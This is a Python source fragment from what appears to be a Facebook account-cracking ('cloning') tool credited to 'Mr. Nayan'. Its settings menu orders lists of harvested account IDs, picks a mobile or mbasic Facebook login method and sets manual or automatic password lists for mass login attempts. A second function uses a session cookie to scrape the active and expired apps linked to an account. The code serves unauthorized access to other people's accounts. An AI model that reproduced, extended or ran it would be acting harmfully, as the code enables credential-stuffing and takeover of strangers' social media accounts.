#-------------[ PENGATURAN-IDZ ]---------------#
def Mr_Nayan_SETTING():
	print('\033[42m\033[1;31m                  [MR. NAYAN]                  \033[40m\033[00m')
	print(f'{h}âž¥âž¥âž£1. Account Old \nâž¥âž¥âž£2. Account New\nâž¥âž¥âž£3. MIX IDZ (NEW/OLD)=>best')
	hu = input('âž¥âž¥âž£ Choose : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('âž¥âž¥âž£\033[94mChoosee the Right Option ')
		exit()
	print('\033[42m\033[1;31m                [LOGIN METHOD]                 \033[40m\033[00m')
	print(f'{h}âž¥âž¥âž£ 1. Mobile(BEST)\nâž¥âž¥âž£ 2. Mbasic')
	hc = input('âž¥âž¥âž£\033[94mChoose : ')
	if hc in ['1','01']:
		method.append('mobile')
#	elif hc in ['2','02']:
#		method.append('free')
#	elif hc in ['3','03']:
#		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	
#	if _jembot_ in ['']:
#		print('âž¥âž¥âž£\033[94mChoosee the Right option ')
#		back()
#	elif _jembot_ in ['y','Y']:
#		taplikasi.append('ya')
#	else:
#		taplikasi.append('no')
	print('\033[42m\033[1;31m                [PASSWARD MENU]                \033[40m\033[00m\n'f'{h}âž¥âž¥âž£Add Password Manual [m]\nâž¥âž¥âž£Awto Password [d] (best)')
	pwplus=input('âž¥âž¥âž£\033[94mChoose : ')
	if pwplus in ['m','M']:
		pwpluss.append('ya')
		cetak(nel('[[purple]â€¢[red]] Add Password Manual Minimam 6 Character  \n[[purple]â€¢[yellow]] Contoh :[green] kakak,ngentod,adik[purple] '))
		pwku=input('#âž¥âž¥âž£Add Password Manual : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
	
#-------------------[ CK APK ]------------#

def cek_apk(session,coki):

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))

    else:

        print(f'\r   %sYour Active Application Details :'%(H))

        for i in range(len(game)):

            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))

    else:

        print(f'\r   %sYour Expired Application Details :'%(M))

        for i in range(len(game)):

            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print(f'\r')

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
            
